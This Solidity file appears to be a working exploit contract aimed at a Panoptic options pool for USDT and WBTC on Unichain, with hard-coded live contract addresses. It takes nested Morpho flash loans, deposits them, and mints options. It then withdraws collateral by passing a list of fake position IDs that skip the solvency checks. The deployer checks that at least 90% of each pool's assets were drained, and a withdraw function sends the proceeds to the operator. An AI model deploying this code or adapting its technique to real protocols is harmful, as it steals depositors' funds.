// SPDX-License-Identifier: AGPL-3.0
pragma solidity ^0.8.13;

import "./Interfaces.sol";
import {TokenId} from "@types/TokenId.sol";

contract WBTC_USDT5bpsUnichainAttacker_Deployer {
    WBTC_USDT5bpsUnichainAttacker public attacker;
    IERC20Partial token0 = IERC20Partial(address(0x9151434b16b9763660705744891fA906F660EcC5)); // usdt
    IERC20Partial token1 = IERC20Partial(address(0x927B51f251480a681271180DA4de28D44EC4AfB8)); // wbtc
    ICollateralTracker tracker0 = ICollateralTracker(address(0x3281055789036D518EC148BCAAa35586Cbc8e6A6));
    ICollateralTracker tracker1 = ICollateralTracker(address(0xB8b4709Ae6012f76E63B2989B55125D7C0f04aAC));
    constructor(address _withdrawer) {
        (uint256 poolAssets0Before, , ) = tracker0.getPoolData();
        (uint256 poolAssets1Before, , ) = tracker1.getPoolData();
        attacker = new WBTC_USDT5bpsUnichainAttacker(_withdrawer);
        attacker.takeFlashLoanAndAttack();
        uint256 attackerBalance0 = token0.balanceOf(address(attacker));
        uint256 attackerBalance1 = token1.balanceOf(address(attacker));
        require(attackerBalance0 >= (poolAssets0Before * 9) / 10);
        require(attackerBalance1 >= (poolAssets1Before * 9) / 10);
    }
}

contract WBTC_USDT5bpsUnichainAttacker is IMorphoFlashLoanCallback {
    uint256[] fake_token_uints = [16988277108887827, 16995993874926379, 17107685890532457, 16940269736292543, 17101708812844843, 16927858255610090, 17069357979992109, 16980362901391387, 17003795739444277, 17026568887818250, 17119985327481433, 17029994500126407, 17030439208130036, 16945967490755149, 17063366226512834, 16905884702516433, 17066504289794370, 16985606900097701, 17114928340284497, 16942964596981210, 17025612530710537, 16889820611195521, 16904132411153761, 16949521359855531, 16920216715452750, 16911017735677536, 17085189125086153, 16914178675719633, 16890694515986045, 17126645520732798, 17074540876198711, 17119951603807036, 17119329401324348, 17122846506677707, 17058114656058193, 16900417526689188, 17036439949713896, 16890488824791009, 16989089162921432, 16946961090832675, 16969179392893693, 17103589480369901, 16918871661380487, 17126049222761791, 17142166672779123, 16897464278369093, 17144420237880467, 17101150678162124, 17114373863952007, 16963022048440415, 16992821954860765, 16992964215424125, 17038739514264792, 17140497124282292, 17100042690718021, 16969369082248421, 16905463410247128, 16983642686367768, 17005578710070990, 17001603935953842, 17074313683106350, 17038292193577029, 16979809844856197, 17004266512915538, 17130759040409663, 16908625724213635, 17166195869489409, 17101208203141327, 17106273295414794, 16895911887472093, 16938993875545352, 17022720534783960, 17075863080850773, 17017661774688634, 17118102226994995, 16913597968133068, 16988465729292003, 16899543848560918, 16908893219668699, 16895531852075711, 17099849001593597, 17153702279128601, 17021555222469713, 16929239666017003, 17020691157262149, 17122672512185594, 17054951623905443, 17045419378318324, 17146520609095429, 16907480429887088, 16962955384487272, 16929389484689115, 16934457177659003, 17016931853357540, 17115324528783460, 17072588196537057, 17032205826932525, 16998536847852287, 16935870331365850, 16905067998086360, 17151127052636987, 17106588479166820, 17004523319620584, 16972063987353239, 16996711919775464, 16968761966455866, 16978155495900437, 16990649632113938, 16913491436315882, 16944179477276374, 17161081997515482, 16889202049759961, 16968143087326031, 17025796118226330, 17087643854683771, 16921290824134246, 16932248563778116, 16991286763756420, 17094346387673542, 17030010218713865, 16970073014124536, 16925847302859862, 2928264379472092293845662340107507, 2928264379472092293845662340107507];

    // On unichain
    IERC20Partial token0 = IERC20Partial(address(0x9151434b16b9763660705744891fA906F660EcC5)); // usdt
    IERC20Partial token1 = IERC20Partial(address(0x927B51f251480a681271180DA4de28D44EC4AfB8)); // wbtc
    IMorpho morpho = IMorpho(address(0x8f5ae9CddB9f68de460C77730b018Ae7E04a140A));

    ICollateralTracker_v4 tracker0 = ICollateralTracker_v4(address(0x3281055789036D518EC148BCAAa35586Cbc8e6A6));
    ICollateralTracker_v4 tracker1 = ICollateralTracker_v4(address(0xB8b4709Ae6012f76E63B2989B55125D7C0f04aAC));
    IPanopticPool_v4 pp = IPanopticPool_v4(address(0x00006d1224C7B77d89ce39ca9Eb161D9DD6a759f));

    int24 constant MIN_V3POOL_TICK = -887272;
    int24 constant MAX_V3POOL_TICK = 887272;

    address private immutable withdrawer;

    bool private executed = false;

    constructor(address _withdrawer) {
        withdrawer = _withdrawer;
    }

    modifier onlyWithdrawer() {
        require(msg.sender == withdrawer, "Only constructor-supplied withdrawer can call this function");
        _;
    }

    function takeFlashLoanAndAttack() public {
        require(!executed);
        // take flash loan
        (uint256 poolAssets0, , ) = tracker0.getPoolData();
        (uint256 poolAssets1, , ) = tracker1.getPoolData();
        {
            // Initiate first flash loan for token0
            uint256 borrowAmount0 = 2 * poolAssets0;
            // Encode the token1 borrow amount for the nested loan
            bytes memory data = abi.encode(borrowAmount0, 2 * poolAssets1, true);
            morpho.flashLoan(address(token0), borrowAmount0, data);
        }
        executed = true;
    }

    uint256 private token0Amount; // Store for nested callback
    function onMorphoFlashLoan(
        uint256 amount,
        bytes calldata data
    ) external override {
        require(!executed);

        (uint256 amount0, uint256 amount1, bool isFirstLoan) =
                    abi.decode(data, (uint256, uint256, bool));

        if (isFirstLoan) {
            // Store token0 amount for later
            token0Amount = amount0;

            // Initiate nested flash loan for token1
            bytes memory nestedData = abi.encode(amount0, amount1, false);
            morpho.flashLoan(address(token1), amount1, nestedData);

            // After the nested callback completes, approve token0 repayment
            token0.approve(address(morpho), amount0);
        } else {
            // This is the nested (token1) flash loan callback
            // We now have both tokens - execute the attack
            drainPool();

            // Approve token1 repayment for the nested loan
            token1.approve(address(morpho), amount1);
        }
    }

    function drainPool() internal {
        // - deposit funds
        (uint256 attackAmount0, , ) = tracker0.getPoolData();
        (uint256 attackAmount1, , ) = tracker1.getPoolData();
        token0.approve(address(tracker0), type(uint104).max);
        token1.approve(address(tracker1), type(uint104).max);

        tracker0.deposit(uint128(token0.balanceOf(address(this))), address(this));
        tracker1.deposit(uint128(token1.balanceOf(address(this))), address(this));

        // - mint ITM options
        TokenId[] memory posIdList = new TokenId[](1);
        // TODO: Insert real TokenIds
        posIdList[0] = TokenId.wrap(3778244379283210732574644690794);
        TokenId[] memory posIdList2 = new TokenId[](2);
        posIdList2[0] = TokenId.wrap(3778244379283210732574644690794);
        posIdList2[1] = TokenId.wrap(2535301209956535024648998936426);

        // --- for Asset 0
        pp.mintOptions(
            posIdList, // positionIdList
            uint128(attackAmount0), // positionSize (half of the pool assets)
            0, // effectiveLiquidityLimitX32
            MIN_V3POOL_TICK, // tickLimitLow
            MAX_V3POOL_TICK, // tickLimitHigh
            true
        );

        // --- for Asset 1
        pp.mintOptions(
            posIdList2, // positionIdList
            uint128(attackAmount1), // positionSize (half of the pool assets)
            0, // effectiveLiquidityLimitX32
            MIN_V3POOL_TICK, // tickLimitLow
            MAX_V3POOL_TICK, // tickLimitHigh
            true
        );

        // ---------------------------------------------------------------------
        // - withdraw funds with fake position list

        // Create a list of positions that don't exist
        TokenId[] memory fakeTokenIdList = generateTokenIdListFromFakeTokenUints();

        // Now use the list of positions that don't exist

        // 1. calculate how much I can withdraw
        uint256 intermediateBalance0 = tracker0.balanceOf(address(this));
        uint256 toWithdraw0 = tracker0.convertToAssets(intermediateBalance0);
        // 2. withdraw with fake list
        tracker0.withdraw(toWithdraw0, address(this), address(this), fakeTokenIdList, true);

        // repeat for token1
        uint256 intermediateBalance1 = tracker1.balanceOf(address(this));
        uint256 toWithdraw1 = tracker1.convertToAssets(intermediateBalance1);
        tracker1.withdraw(toWithdraw1, address(this), address(this), fakeTokenIdList, true);

        // now liquidate my own position and repeat...
        // NOTE: Now that we execute the attack with a single drainPool, no need to do this - just
        // leave the uncollateralised positions open
        /* TokenId[] memory emptyTokenList = new TokenId[](0);
        pp.liquidate(emptyTokenList, address(this), posIdList2); */
    }

    function generateTokenIdListFromFakeTokenUints() internal view returns (TokenId[] memory fakeTokenIdList) {
        fakeTokenIdList = new TokenId[](fake_token_uints.length);
        for (uint16 i = 0; i < fake_token_uints.length;) {
            fakeTokenIdList[i] = TokenId.wrap(fake_token_uints[i]);
            unchecked {
              ++i;
            }
        }
    }

    function min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }

    function withdraw(address tokenAddress, uint256 amount) external onlyWithdrawer {
        if (tokenAddress == address(0)) {
            // Withdraw ETH
            require(address(this).balance >= amount, "Insufficient ETH balance");
            (bool success, ) = payable(withdrawer).call{value: amount}("");
            require(success, "ETH transfer failed");
        } else {
            // Withdraw ERC20 token
            IERC20Partial token = IERC20Partial(tokenAddress);
            require(token.balanceOf(address(this)) >= amount, "Insufficient token balance");
            token.transfer(withdrawer, amount); // revert if token transfer fails
        }
    }

    // Required to receive ETH when unwrapping WETH
    receive() external payable {
        // Accept ETH from WETH unwrapping
    }

    // Fallback for any other ETH transfers
    fallback() external payable {
        // Handle unexpected ETH transfers
    }
}
